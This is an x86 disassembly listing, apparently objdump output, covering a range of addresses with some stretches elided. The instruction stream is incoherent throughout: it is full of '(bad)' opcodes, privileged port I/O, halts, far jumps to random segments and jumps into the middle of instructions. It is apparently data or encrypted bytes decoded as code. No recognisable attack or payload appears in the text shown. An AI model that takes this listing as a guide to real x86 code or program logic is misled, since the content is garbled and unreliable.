  40a829:	fisub  WORD PTR [ecx+0x29d63bbc]
  40a82f:	and    eax,0x212dec0d
  40a834:	inc    edx
  40a835:	shr    DWORD PTR [ecx],cl
  40a837:	push   ds
  40a838:	sub    eax,0x2d253e8d
  40a83d:	lds    eax,FWORD PTR [eax+0x1b]
  40a840:	push   ss
  40a841:	out    0x2f,eax
	...
  40a85b:	add    BYTE PTR [ebp-0xdbe07de],dh
  40a861:	pop    es
  40a862:	in     al,0xe9
  40a864:	test   DWORD PTR [eax+eax*1],0xd335e31e
  40a86b:	inc    ebx
  40a86c:	out    0x34,al
  40a86e:	jecxz  0x40a8db
  40a870:	clc    
  40a871:	add    al,0x0
  40a873:	popf   
  40a874:	push   ecx
  40a875:	popf   
  40a876:	add    BYTE PTR [si+0x6a],bh
  40a87a:	push   0x0
  40a87c:	sar    dl,cl
  40a87e:	out    dx,eax
  40a87f:	jecxz  0x40a873
  40a881:	lock fcomip st,st(6)
  40a884:	int    0xd0
  40a886:	idiv   ah
  40a888:	(bad)  
  40a889:	lock call 0xda346883
  40a88f:	into   
  40a890:	mov    ebx,0xaff1e6ef
  40a895:	jmp    0xe7f9:0xf388aff9
  40a89c:	xchg   esi,eax
  40a89d:	rcl    edx,0xc5
  40a8a0:	mov    ecx,0x5adad9e3
  40a8a5:	iret   
  40a8a6:	(bad)  
  40a8a7:	sar    DWORD PTR [edx+0x6dd7d2f9],1
  40a8ad:	ret    0xd3
  40a8b0:	repnz inc ecx
  40a8b2:	push   esi
  40a8b3:	inc    ebp
  40a8b4:	rcl    DWORD PTR [ecx],1
  40a8b6:	popa   
  40a8b7:	push   edx
  40a8b8:	(bad)  
  40a8b9:	pop    eax
  40a8ba:	(bad)  
  40a8bb:	call   FWORD PTR [edx-0xc]
  40a8be:	imul   ebx
	...
  40a8d8:	add    BYTE PTR [edx-0x6],bh
  40a8db:	out    0xfe,eax
  40a8dd:	push   ebp
  40a8de:	(bad)  
  40a8e0:	hlt    
  40a8e1:	mov    edi,0xc7fce0f7
  40a8e6:	cli    
  40a8e7:	rol    esi,1
  40a8e9:	mov    bl,0xf6
  40a8eb:	out    dx,al
  40a8ec:	stc    
  40a8ed:	mov    bh,0xe1
  40a8ef:	icebp  
  40a8f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8f1:	and    bl,bh
  40a8f3:	icebp  
  40a8f4:	out    dx,eax
  40a8f5:	out    dx,al
  40a8f6:	enter  0xcdda,0xb1
  40a8fa:	in     eax,dx
  40a8fb:	fcmovbe st,st(2)
  40a8fd:	out    0x1,eax
  40a8ff:	add    BYTE PTR [eax],al
  40a901:	ret    0xb4a1
  40a904:	mov    ds:0xb0a5a0a4,eax
  40a909:	hlt    
  40a90a:	scas   eax,DWORD PTR es:[edi]
  40a90b:	psubd  mm3,QWORD PTR [edi-0x38]
  40a90f:	push   edx
  40a910:	stos   DWORD PTR es:[edi],eax
  40a911:	bound  esi,QWORD PTR [edi-0x35b911af]
  40a917:	fs mov dh,0x45
  40a91a:	iret   
  40a91b:	inc    edi
  40a91c:	out    0x55,al
  40a91e:	mov    ebp,0x8ab1a960
  40a923:	outs   dx,DWORD PTR ds:[esi]
  40a924:	xchg   ebp,eax
  40a925:	mov    DWORD PTR [ecx+0x33],0x2ca4c4d6
  40a92c:	shl    DWORD PTR [esi-0x7d76eed6],1
  40a932:	xchg   esi,eax
  40a933:	je     0x40a8f4
  40a935:	gs scas eax,DWORD PTR es:[edi]
  40a937:	test   DWORD PTR [edx-0x65829c4f],eax
	...
  40a955:	add    BYTE PTR [edx-0x4c],dh
  40a958:	mov    DWORD PTR [bp+di+0x239f],edx
  40a95d:	in     al,0xa4
  40a95f:	jg     0x40a988
  40a961:	loope  0x40a8fc
  40a963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a964:	push   ds
  40a965:	stc    
  40a966:	call   0x5dca:0x51b04972
  40a96d:	mov    ebx,0x39778
  40a972:	hlt    
  40a973:	jae    0x40a9a0
  40a975:	retf   0x8d98
  40a978:	sub    ebx,ecx
  40a97a:	inc    ebx
  40a97b:	fidiv  DWORD PTR [edi-0x7b]
  40a97e:	cmp    al,0xdf
  40a980:	das    
  40a981:	aam    0x31
  40a983:	fidiv  WORD PTR [edx]
  40a985:	xchg   ecx,eax
  40a986:	cmp    ebp,ecx
  40a988:	xor    dl,al
  40a98a:	daa    
  40a98b:	jmp    0x40a9fa
  40a98d:	aam    0x2d
  40a98f:	in     eax,0x2e
  40a991:	fisubr DWORD PTR [ebx]
  40a993:	ficomp WORD PTR [edi+eiz*8]
  40a996:	dec    ebx
  40a997:	(bad)  
  40a998:	and    al,0xe4
  40a99a:	sub    al,0x4
  40a99c:	dec    esi
  40a99d:	pop    esp
  40a99e:	push   ebx
  40a99f:	dec    esi
  40a9a0:	push   ecx
  40a9a1:	dec    edi
  40a9a2:	jb     0x40aa20
  40a9a4:	add    DWORD PTR [ebx],ebx
  40a9a6:	push   ds
  40a9a7:	sbb    BYTE PTR [edi],ah
  40a9a9:	sbb    al,0x1d
  40a9ab:	add    eax,0x1e4147fa
  40a9b0:	or     cl,BYTE PTR ds:0x71671119
  40a9b6:	xor    eax,0x796477
	...
  40a9d3:	jle    0x40a972
  40a9d5:	xchg   edx,eax
  40a9d6:	jge    0x40a978
  40a9d8:	xchg   ebx,eax
  40a9d9:	je     0x40aa4a
  40a9db:	jnp    0x40a96f
  40a9dd:	bound  esi,QWORD PTR [ebp-0x3b]
  40a9e0:	mov    ds:0x98647276,al
  40a9e5:	pop    eax
  40a9e6:	and    BYTE PTR [ecx+0x667197df],0xa3
  40a9ed:	jbe    0x40aa4b
  40a9ef:	sar    dl,cl
  40a9f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f2:	inc    ebp
  40a9f3:	jb     0x40a9b3
  40a9f5:	dec    eax
  40a9f6:	push   ecx
  40a9f7:	mov    WORD PTR [ebx-0x10a69fa7],?
  40a9fd:	xchg   ebp,eax
  40a9fe:	pop    edx
  40a9ff:	pop    esi
  40aa00:	ret    0x5d3c
  40aa03:	inc    esi
  40aa04:	mov    bl,0x54
  40aa06:	or     eax,0x4949bc54
  40aa0b:	jo     0x40a9b6
  40aa0d:	sub    al,0xbd
  40aa0f:	and    ecx,DWORD PTR [esi+eiz*1-0x45]
  40aa13:	out    0x4b,eax
  40aa15:	mov    ch,0xa7
  40aa17:	mov    ch,0x46
  40aa19:	jmp    0xafb3:0xb548f6f7
  40aa20:	pop    edi
  40aa21:	stc    
  40aa22:	push   es
  40aa23:	or     dh,BYTE PTR ds:0x48a5c2a9
  40aa29:	iret   
  40aa2a:	ret    
  40aa2b:	mov    ah,0x5b
  40aa2d:	add    dl,al
  40aa2f:	sbb    esi,DWORD PTR [ecx]
  40aa31:	jge    0x40a9f0
  40aa33:	xchg   edx,eax
  40aa34:	cmp    BYTE PTR [eax-0x6b],0x0
	...
  40aa50:	xchg   DWORD PTR [edx+0x75589728],eax
  40aa56:	ins    BYTE PTR es:[edi],dx
  40aa57:	stos   DWORD PTR es:[edi],eax
  40aa58:	jns    0x40aad4
  40aa5a:	jnp    0x40aadb
  40aa5c:	push   0x78b37d79
  40aa61:	sub    BYTE PTR [esi+0x75],0x73
  40aa65:	inc    ecx
  40aa66:	popa   
  40aa67:	in     al,dx
  40aa68:	repnz sbb al,0x31
  40aa6b:	out    0xf5,eax
  40aa6d:	or     al,0xf
  40aa6f:	cs test al,0x4a
  40aa72:	add    cl,ch
  40aa74:	jmp    0x40aa89
  40aa76:	pop    es
  40aa77:	cmp    eax,0xdd7475b5
  40aa7c:	shl    BYTE PTR [ecx],1
  40aa7e:	or     BYTE PTR [ebx],dl
  40aa80:	hlt    
  40aa81:	or     DWORD PTR [ebx],edx
  40aa83:	(bad)  
  40aa84:	(bad)  
  40aa85:	push   esp
  40aa86:	add    DWORD PTR [ecx],eax
  40aa88:	popf   
  40aa89:	cmp    eax,0x35bc093c
  40aa8e:	fs fcmovne st,st(2)
  40aa91:	cmp    BYTE PTR [eax],ch
  40aa93:	dec    eax
  40aa95:	cmp    DWORD PTR [eax],esp
  40aa97:	fldcw  WORD PTR [edx-0x5a26fed2]
  40aa9d:	sub    edi,DWORD PTR [edi]
  40aa9f:	mov    edi,0xfa332896
  40aaa4:	jnp    0x40ab1c
  40aaa6:	xor    al,0xa5
  40aaa8:	xor    cl,ah
  40aaaa:	retf   0xe969
  40aaad:	stos   BYTE PTR es:[edi],al
  40aaae:	lahf   
  40aaaf:	cmp    DWORD PTR ds:0x5fd3c7,esp
	...
  40aacd:	sub    dh,dl
  40aacf:	(bad)  
  40aad0:	xor    ah,ah
  40aad2:	mov    eax,ds:0xd3212dcc
  40aad7:	mov    DWORD PTR [eax],0x98ce4911
  40aadd:	sbb    edi,DWORD PTR [eax]
  40aadf:	rcr    esp,0xdf
  40aae2:	or     eax,0x27b9ecfa
  40aae7:	call   ebp
  40aae9:	add    DWORD PTR [ebx],esp
  40aaeb:	hlt    
  40aaec:	jecxz  0x40aadd
  40aaee:	adc    esi,ecx
  40aaf0:	out    0xbe,eax
  40aaf2:	sbb    eax,0x4413f1f7
  40aaf7:	hlt    
  40aaf8:	hlt    
  40aaf9:	or     edx,DWORD PTR [esi]
  40aafb:	mov    ch,0xba
  40aafd:	mov    esp,0xa3fef216
  40ab02:	jg     0x40aaca
  40ab04:	aad    0xf9
  40ab06:	sub    al,BYTE PTR [eax]
  40ab08:	add    BYTE PTR [ecx-0x320815f6],ah
  40ab0e:	push   es
  40ab0f:	add    BYTE PTR [eax],al
  40ab11:	outs   dx,BYTE PTR ds:[esi]
  40ab12:	outs   dx,BYTE PTR ds:[esi]
  40ab13:	mov    edx,0x987c5f8c
  40ab18:	test   BYTE PTR [ecx],ch
  40ab1a:	test   bh,bh
  40ab1c:	call   ecx
  40ab1e:	(bad)  [edi]
  40ab20:	cmp    DWORD PTR [ebx+edx*8+0x8fc7e3d],edi
  40ab27:	add    BYTE PTR [eax],al
  40ab29:	xchg   ebp,eax
  40ab2a:	shl    DWORD PTR [ebx],1
  40ab2c:	sub    eax,0x3c29e7b8
	...
  40ab49:	add    bl,dh
  40ab4b:	loopne 0x40ab77
  40ab4d:	sub    bl,BYTE PTR [ebp-0x4dfffffa]
  40ab53:	into   
  40ab54:	sub    edi,DWORD PTR [ebx]
  40ab56:	in     eax,dx
  40ab57:	loope  0x40ab96
  40ab59:	add    dh,ch
  40ab5b:	enter  0x4454,0x1b
  40ab5f:	les    eax,FWORD PTR [edi+0x75]
  40ab62:	cmp    eax,0x994054bc
  40ab67:	mov    edx,0xf5f40056
  40ab6c:	out    0x2f,al
  40ab6e:	fild   DWORD PTR [esi+edx*8]
  40ab71:	xor    edx,edi
  40ab73:	jmp    0x40ab77
  40ab75:	add    ah,dh
  40ab77:	pop    ebx
  40ab78:	jbe    0x40ab08
  40ab7a:	outs   dx,DWORD PTR ds:[esi]
  40ab7b:	aas    
  40ab7c:	or     ebp,DWORD PTR [ebx-0xda0c6db]
  40ab82:	adc    eax,0x7cf61e10
  40ab87:	outs   dx,DWORD PTR ds:[esi]
  40ab88:	aas    
  40ab89:	shl    ah,0xdf
  40ab8c:	fisubr DWORD PTR [edx]
  40ab8e:	lods   eax,DWORD PTR ds:[esi]
  40ab8f:	std    
  40ab90:	call   0x32c9799
  40ab95:	add    ah,dh
  40ab97:	sbb    ch,BYTE PTR [edi]
  40ab99:	fidiv  DWORD PTR [edi]
  40ab9b:	adc    dl,BYTE PTR [ecx]
  40ab9d:	shl    bl,cl
  40ab9f:	call   FWORD PTR [eax+ebp*8]
  40aba2:	in     al,dx
  40aba3:	scas   eax,DWORD PTR es:[edi]
  40aba4:	or     ebp,edi
  40aba6:	aad    0xe3
  40aba8:	or     eax,DWORD PTR [eax]
  40abaa:	hlt    
  40abab:	ror    DWORD PTR [edx],cl
  40abad:	cmc    
	...
  40abc6:	add    al,ah
  40abc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abc9:	sub    al,0xeb
  40abcb:	test   eax,0xf4d0359d
  40abd0:	mov    al,ds:0xc799d025
  40abd5:	pop    es
  40abd6:	into   
  40abd7:	lods   al,BYTE PTR ds:[esi]
  40abd8:	mov    edx,0x29f4f51a
  40abdd:	mov    DWORD PTR [edx+0xe],esi
  40abe0:	xor    esp,DWORD PTR [edi-0x3dd8d39b]
  40abe6:	popa   
  40abe7:	ds cmp al,0x9a
  40abea:	inc    ebx
  40abeb:	xor    BYTE PTR [ebx+edi*4],bl
  40abee:	push   esp
  40abef:	sub    eax,0xf400042f
  40abf4:	push   edi
  40abf5:	test   DWORD PTR [edx-0x22da5a85],eax
  40abfb:	hlt    
  40abfc:	add    al,0xc8
  40abfe:	xchg   edx,esp
  40ac00:	jle    0x40abe1
  40ac02:	int    0xfb
  40ac04:	and    ebp,ecx
  40ac06:	add    esi,esp
  40ac08:	add    al,0x4f
  40ac0a:	and    edx,DWORD PTR [edi+eiz*8+0x63]
  40ac0e:	and    BYTE PTR [edx-0x7c],0xe8
  40ac12:	add    esi,esp
  40ac14:	add    al,0x6d
  40ac16:	push   ebp
  40ac17:	addr16 mov dl,0x7e
  40ac1a:	push   edx
  40ac1b:	pop    esi
  40ac1c:	mov    esp,0xa35a4c54
  40ac21:	inc    ebp
  40ac22:	add    al,0xf4
  40ac24:	add    al,0xfc
  40ac26:	loop   0x40abfe
  40ac28:	and    ebx,eax
  40ac2a:	fiadd  WORD PTR [eax]
	...
  40ac44:	mov    BYTE PTR [esi+esi*1],0x1d
  40ac48:	or     dh,ah
  40ac4a:	call   0x5245a052
  40ac4f:	dec    esi
  40ac50:	test   al,0xb0
  40ac52:	das    
  40ac53:	push   ebx
  40ac54:	sahf   
  40ac55:	rep ins BYTE PTR es:[edi],dx
  40ac57:	pop    ebx
  40ac58:	xchg   esi,eax
  40ac59:	mov    bh,0xe8
  40ac5b:	add    esi,esp
  40ac5d:	add    al,0x22
  40ac5f:	sahf   
  40ac60:	push   edi
  40ac61:	add    BYTE PTR [eax-0x5d],0x4d
  40ac65:	and    esi,DWORD PTR ds:0x39694fa0
  40ac6b:	cdq    
  40ac6c:	mov    ebx,0x37aa1900
  40ac71:	pop    edi
  40ac72:	or     eax,0x870544b3
  40ac77:	dec    esp
  40ac78:	dec    ebp
  40ac79:	test   al,0x5b
  40ac7b:	pop    esp
  40ac7c:	dec    ebp
  40ac7d:	rol    BYTE PTR [ebp+0x3fa3627d],0x62
  40ac84:	pop    ecx
  40ac85:	lods   al,BYTE PTR ds:[esi]
  40ac86:	inc    ebx
  40ac87:	add    esi,esp
  40ac89:	add    al,0x8e
  40ac8b:	inc    esp
  40ac8c:	ins    DWORD PTR es:[edi],dx
  40ac8d:	in     eax,dx
  40ac8e:	jmp    DWORD PTR [ebx-0x593931ce]
  40ac94:	sub    eax,0xb5607fcd
  40ac99:	(bad)  
  40ac9a:	leave  
  40ac9b:	cmp    dh,bh
  40ac9d:	add    al,0x0
  40ac9f:	adc    al,BYTE PTR [ebp+0x61]
  40aca2:	cmp    al,0xf0
  40aca4:	inc    esi
  40aca5:	and    DWORD PTR [ebx],edx
  40aca7:	fiadd  DWORD PTR [eax]
	...
  40acc1:	pop    ecx
  40acc2:	sbb    al,0x54
  40acc4:	or     al,0x4a
  40acc6:	push   ss
  40acc7:	push   ds
  40acc8:	out    dx,al
  40acc9:	pusha  
  40acca:	jno    0x40ad37
  40accc:	jmp    0x3440b1c8
  40acd1:	int3   
  40acd2:	add    al,0x0
  40acd4:	in     al,dx
  40acd5:	or     al,0x65
  40acd7:	push   edi
  40acd8:	mov    esi,0x600004f7
  40acdd:	je     0x40ac67
  40acdf:	mov    WORD PTR [ecx-0x75],ds
  40ace2:	xchg   edx,eax
  40ace3:	popf   
  40ace4:	jmp    0x7040b1e0
  40ace9:	popf   
  40acea:	pop    esp
  40aceb:	pop    esi
  40acec:	popf   
  40aced:	test   al,0x12
  40acef:	jp     0x40ad38
  40acf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acf2:	pusha  
  40acf3:	push   edi
  40acf4:	cmp    al,0x8d
  40acf6:	push   esp
  40acf7:	add    BYTE PTR [ebx-0x390b0d19],bh
  40acfd:	push   ss
  40acfe:	mov    ebp,0xf6efbcd0
  40ad03:	sti    
  40ad04:	mov    bh,0xe0
  40ad06:	cli    
  40ad07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad08:	mov    cl,BYTE PTR ds:0x6c0e4ea
  40ad0e:	icebp  
  40ad0f:	out    dx,eax
  40ad10:	fwait
  40ad11:	and    DWORD PTR [edi+edi*8-0x4b4dc2b1],eax
  40ad18:	inc    ebp
  40ad19:	and    eax,0x2d48b0af
  40ad1e:	mov    eax,0x38d00e5
	...
  40ad3b:	add    BYTE PTR [eax],al
  40ad3d:	add    BYTE PTR [edi+eax*8-0x7e7c5c3],ch
  40ad44:	sbb    BYTE PTR [edx],bl
  40ad46:	push   esp
  40ad47:	dec    BYTE PTR [ebx]
  40ad49:	push   ss
  40ad4a:	imul   eax,DWORD PTR [eax],0xf05d1205
  40ad50:	adc    ebx,DWORD PTR [edx-0x70]
  40ad53:	jmp    0x1614:0xef5b1d0f
  40ad5a:	cdq    
  40ad5b:	mov    ecx,0xc5575355
  40ad60:	(bad)  
  40ad61:	(bad)  
  40ad62:	jge    0x40adab
  40ad64:	mov    esi,0x9b7d09bb
  40ad69:	fwait
  40ad6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad6b:	test   BYTE PTR [ebx-0x78817769],cl
  40ad71:	xchg   ebx,eax
  40ad72:	mov    WORD PTR [esi-0x6c],gs
  40ad75:	rcr    ecx,0x80
  40ad78:	lea    ebx,[edx-0x616c9671]
  40ad7e:	pushf  
  40ad7f:	inc    eax
  40ad80:	aam    0xd2
  40ad82:	es sbb al,0xe6
  40ad85:	jmp    0x40ada0
  40ad87:	pop    ebp
  40ad88:	mov    ebp,0xb05882bc
  40ad8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad8e:	aam    0x21
  40ad90:	jecxz  0x40ad46
  40ad92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad93:	xor    eax,0x5ce0000
  40ad98:	add    BYTE PTR ds:0x113eeda,bl
  40ad9e:	sahf   
  40ad9f:	out    dx,al
  40ada0:	adc    al,0x56
	...
  40adba:	add    BYTE PTR [ebx-0x3ff5f64c],ah
  40adc0:	mov    eax,0xfca10e04
  40adc5:	inc    edi
  40adc6:	adc    ch,dh
  40adc8:	dec    DWORD PTR [ebx]
  40adca:	pop    es
  40adcb:	hlt    
  40adcc:	call   0xd63cb5d3
  40add1:	add    al,BYTE PTR [eax]
  40add3:	hlt    
  40add4:	pop    eax
  40add5:	sub    dh,BYTE PTR [ebp+0x2ec41]
  40addb:	hlt    
  40addc:	adc    DWORD PTR [ebx-0x67011687],ecx
  40ade2:	das    
  40ade3:	mov    ebp,0xe07d91e8
  40ade8:	fisttp QWORD PTR [edx-0x68fcdd8f]
  40adee:	jb     0x40adc5
  40adf0:	into   
  40adf1:	loopne 0x40ae1f
  40adf3:	int3   
  40adf4:	int    0x9e
  40adf6:	ins    BYTE PTR es:[edi],dx
  40adf7:	aad    0xba
  40adf9:	lahf   
  40adfa:	pop    es
  40adfb:	add    ch,ah
  40adfd:	add    al,BYTE PTR [eax]
  40adff:	hlt    
  40ae00:	and    DWORD PTR [eiz*8-0x4deebde],ebx
  40ae07:	push   edi
  40ae08:	cmp    DWORD PTR [edx],ecx
  40ae0a:	repz sbb edx,DWORD PTR [edi+0x5f]
  40ae0e:	mov    ds:0x717801,al
  40ae13:	hlt    
  40ae14:	dec    edi
  40ae15:	push   esp
  40ae16:	les    ebp,FWORD PTR [edi]
  40ae18:	das    
  40ae19:	inc    ecx
  40ae1a:	leave  
  40ae1b:	mov    edx,0x5c23
	...
  40ae38:	hlt    
  40ae39:	gs or  esp,eax
  40ae3c:	fmul   st,st(5)
  40ae3e:	jmp    0x4ae803f
  40ae43:	add    ah,dh
  40ae45:	js     0x40ae3e
  40ae47:	not    eax
  40ae49:	(bad)  
  40ae4a:	out    dx,al
  40ae4b:	call   0xa493:0xefa8b9f4
  40ae52:	xor    DWORD PTR [ebx-0x484f8e96],0x5a
  40ae59:	int3   
  40ae5a:	std    
  40ae5b:	sti    
  40ae5c:	outs   dx,DWORD PTR ds:[esi]
  40ae5d:	add    al,0xb4
  40ae5f:	xchg   edi,eax
  40ae60:	popa   
  40ae61:	mov    ds:0xae5be657,eax
  40ae66:	push   ebp
  40ae67:	mov    edi,0xf381f64c
  40ae6c:	cmp    eax,0x50899ac2
  40ae71:	mov    ecx,0x9844aa48
  40ae76:	push   esi
  40ae77:	mov    cs,WORD PTR [edi+0x3ff477c6]
  40ae7d:	test   eax,0x4f403e8
  40ae82:	inc    edi
  40ae83:	in     al,dx
  40ae84:	pop    ebp
  40ae85:	jmp    0x44c:0xf759f352
  40ae8c:	hlt    
  40ae8d:	add    al,0xef
  40ae8f:	sbb    esi,eax
  40ae91:	inc    esi
  40ae92:	jmp    0xa445a29a
  40ae97:	popa   
  40ae98:	int    0x4
  40ae9a:	addr16 aad 0x0
	...
  40aeb5:	jle    0x40ae44
  40aeb7:	jo     0x40ae40
  40aeb9:	inc    ecx
  40aeba:	sahf   
  40aebb:	outs   dx,BYTE PTR ds:[esi]
  40aebc:	fstp   QWORD PTR [edi+ecx*4]
  40aebf:	xor    al,0x85
  40aec1:	or     edi,ebp
  40aec3:	jne    0x40ae8f
  40aec5:	jo     0x40ae5f
  40aec7:	sub    ecx,DWORD PTR [esi+0x3e8c664]
  40aecd:	hlt    
  40aece:	add    al,0x7d
  40aed0:	add    edx,DWORD PTR [ebx+0x70]
  40aed3:	jmp    0xac45a2db
  40aed8:	mov    ah,0xa8
  40aeda:	add    cl,ah
  40aedc:	test   DWORD PTR [ecx-0xbfc5428],0xd4f9c704
  40aee6:	xchg   ebp,eax
  40aee7:	pop    edx
  40aee8:	(bad)  
  40aee9:	mov    ebx,0xc9c998fc
  40aeee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aeef:	dec    DWORD PTR [ebx+0x53fefca3]
  40aef5:	outs   dx,BYTE PTR ds:[esi]
  40aef6:	mov    BYTE PTR [eax-0x3020404b],al
  40aefc:	jo     0x40aea9
  40aefe:	cld    
  40aeff:	(bad)  
  40af00:	daa    
  40af01:	sbb    al,0x61
  40af03:	push   0x2b5817fd
  40af08:	mov    eax,0xb4275fbf
  40af0d:	xor    ebx,DWORD PTR [ebx+eiz*1-0x40]
  40af11:	pop    ss
  40af12:	dec    eax
  40af13:	add    BYTE PTR [eax-0x79],ah
  40af16:	call   0x0:0x42ff
	...
  40af31:	add    BYTE PTR [esi],ch
  40af33:	(bad)  
  40af34:	sar    BYTE PTR [edi],0xf7
  40af37:	add    al,0x0
  40af39:	loope  0x40af1f
  40af3b:	add    DWORD PTR [ecx],edx
  40af3d:	out    dx,eax
  40af3e:	(bad)  
  40af3f:	add    al,0x0
  40af41:	or     bh,bh
  40af43:	cmp    BYTE PTR [ebp+0xd],bh
  40af46:	fidiv  WORD PTR [ecx+edi*1]
  40af49:	mov    edi,0x6c0004f7
  40af4e:	arpl   WORD PTR [edi+eiz*4-0x2739b5a2],si
  40af55:	cmp    bl,BYTE PTR [ebx-0x6]
  40af58:	mov    al,ds:0x98876169
  40af5d:	xor    eax,0xe9bdcd26
  40af62:	test   DWORD PTR [eax+eax*1],0xecf7b00f
  40af69:	xor    eax,0x4bbbe8ec
  40af6e:	popf   
  40af6f:	lods   al,BYTE PTR ds:[esi]
  40af70:	cld    
  40af71:	rcr    ebx,1
  40af73:	sti    
  40af74:	(bad)  
  40af75:	hlt    
  40af76:	in     al,dx
  40af77:	das    
  40af78:	sbb    eax,0x4f7f0
  40af7d:	push   cs
  40af7e:	add    eax,DWORD PTR [ebx]
  40af80:	sbb    eax,DWORD PTR [eax]
  40af82:	pushf  
  40af83:	pop    es
  40af84:	add    BYTE PTR [eax],al
  40af86:	shl    al,0xf1
  40af89:	imul   BYTE PTR [edi-0x46]
  40af8c:	stos   BYTE PTR es:[edi],al
  40af8d:	lods   eax,DWORD PTR ds:[esi]
  40af8e:	jp     0x40af31
  40af90:	call   0xed1e3781
  40af95:	call   0x40af9a
	...
  40afae:	add    BYTE PTR [ebx-0x5d],ch
  40afb1:	lods   al,BYTE PTR ds:[esi]
  40afb2:	mov    al,ds:0xf0f4c63d
  40afb7:	jae    0x40af64
  40afb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afba:	test   al,0x25
  40afbc:	mov    edi,0x9688e9f8
  40afc1:	cwde   
  40afc2:	hlt    
  40afc3:	cdq    
  40afc4:	retf   
  40afc5:	retf   0x95d6
  40afc8:	loopne 0x40af88
  40afca:	leave  
  40afcb:	or     ecx,edi
  40afcd:	jg     0x40afcf
  40afcf:	shl    DWORD PTR [esi+0xcd94a0],1
  40afd5:	add    BYTE PTR [eax],al
  40afd7:	push   edx
  40afd8:	add    DWORD PTR [ecx],eax
  40afda:	add    al,0x4d
  40afdc:	dec    edi
  40afdd:	pop    esi
  40afde:	pop    edi
  40afdf:	and    DWORD PTR [eax],ebx
  40afe1:	push   ds
  40afe2:	or     DWORD PTR [esp],edx
  40afe5:	pop    ss
  40afe6:	or     al,0x48
  40afe8:	and    al,0x6
  40afea:	or     ebx,DWORD PTR [ecx+edx*1]
  40afed:	dec    edi
  40afee:	dec    edx
  40afef:	pop    ebp
  40aff0:	xor    al,0x18
  40aff2:	sbb    BYTE PTR [esi],bl
  40aff4:	adc    al,0x7
  40aff6:	sbb    al,0x33
  40aff8:	xor    dh,BYTE PTR [eax+eiz*1]
  40affb:	aaa    
  40affc:	cmp    bh,BYTE PTR [edi]
  40affe:	jg     0x40afb8
  40b000:	cmp    bh,BYTE PTR [ebx]
  40b002:	jae    0x40afb3
  40b004:	xor    bh,BYTE PTR ds:0x6f7f923d
  40b00a:	and    BYTE PTR [ecx],al
  40b00c:	xor    al,0x20
  40b00e:	sub    esp,edi
  40b010:	or     ebp,DWORD PTR [ecx]
  40b012:	jno    0x40b014
	...
  40b02c:	hlt    
  40b02d:	dec    esp
  40b02e:	add    al,0x0
  40b030:	hlt    
  40b031:	dec    ebp
  40b032:	gs fs push edx
  40b035:	dec    ebx
  40b036:	ins    BYTE PTR es:[edi],dx
  40b037:	push   0x1f
  40b039:	dec    eax
  40b03a:	outs   dx,DWORD PTR ds:[esi]
  40b03b:	outs   dx,BYTE PTR ds:[esi]
  40b03c:	and    al,0x3d
  40b03e:	jbe    0x40b0b3
  40b040:	sub    BYTE PTR [edx],dh
  40b042:	jns    0x40b0bc
  40b044:	push   ds
  40b045:	or     eax,0x11236967
  40b04a:	jnp    0x40b04c
  40b04c:	hlt    
  40b04d:	and    al,0x75
  40b04f:	push   edi
  40b050:	adc    edx,DWORD PTR [ebx]
  40b052:	cmp    dh,BYTE PTR [esp]
  40b055:	(bad)  
  40b056:	outs   dx,DWORD PTR ds:[esi]
  40b057:	arpl   cx,bx
  40b059:	(bad)  
  40b05a:	jae    0x40b05c
  40b05c:	hlt    
  40b05d:	int    0x2
  40b05f:	and    eax,0x2202fef4
  40b064:	hlt    
  40b065:	jmp    0x40b069
  40b067:	add    ah,dh
  40b069:	or     eax,0xdef42504
  40b06e:	add    ah,BYTE PTR [edx]
  40b070:	hlt    
  40b071:	or     eax,DWORD PTR [eiz*1+0x2bef4]
  40b078:	hlt    
  40b079:	mov    al,0x73
  40b07b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40b07d:	enter  0x7670,0xd2
  40b081:	mov    edi,0xaef46c6e
  40b086:	je     0x40b0ed
  40b088:	xchg   ebp,eax
  40b089:	(bad)  
  40b08a:	gs inc ebp
  40b08c:	call   0x0:0x726999
	...
  40b0a7:	add    BYTE PTR [eax],al
  40b0a9:	xchg   ebx,eax
  40b0aa:	jns    0x40b11a
  40b0ac:	mov    dh,BYTE PTR gs:[edi+0x45]
  40b0b0:	ins    BYTE PTR es:[edi],dx
  40b0b1:	arpl   WORD PTR [edi-0x580bff95],cx
  40b0b7:	gs jae 0x40b122
  40b0ba:	jle    0x40b12c
  40b0bc:	jns    0x40b0ef
  40b0be:	add    eax,0x775d7657
  40b0c3:	dec    esi
  40b0c4:	outs   dx,BYTE PTR ds:[esi]
  40b0c5:	pop    ecx
  40b0c6:	pusha  
  40b0c7:	inc    edi
  40b0c8:	js     0x40b100
  40b0ca:	imul   edi,DWORD PTR [esi],0x3054f63
  40b0d0:	push   0x69450f01
  40b0d5:	sbb    BYTE PTR ds:0x2727290b,ah
  40b0db:	fmul   QWORD PTR [ecx]
  40b0dd:	or     eax,0xc68c963
  40b0e2:	ins    BYTE PTR es:[edi],dx
  40b0e3:	sbb    bh,BYTE PTR [eax-0x2c]
  40b0e6:	es int3 
  40b0e8:	jb     0x40b0c0
  40b0ea:	and    al,0x6
  40b0ec:	outs   dx,DWORD PTR ds:[esi]
  40b0ed:	add    BYTE PTR [edx-0x37],ch
  40b0f0:	addr16 hlt 
  40b0f2:	add    al,0xb
  40b0f4:	add    al,0xd5
  40b0f6:	add    al,0xfd
  40b0f8:	add    esi,esp
  40b0fa:	add    al,0x29
  40b0fc:	imul   edx,edi,0xe323d66c
  40b102:	(bad)  
  40b103:	(bad)  
  40b104:	adc    dh,bh
  40b106:	pop    ds
  40b107:	ficom  DWORD PTR [eax]
  40b109:	out    dx,al
  40b10a:	pusha  
  40b10b:	les    ebp,FWORD PTR [edi+0x0]
	...
  40b126:	adc    al,0x2a
  40b128:	scas   eax,DWORD PTR es:[edi]
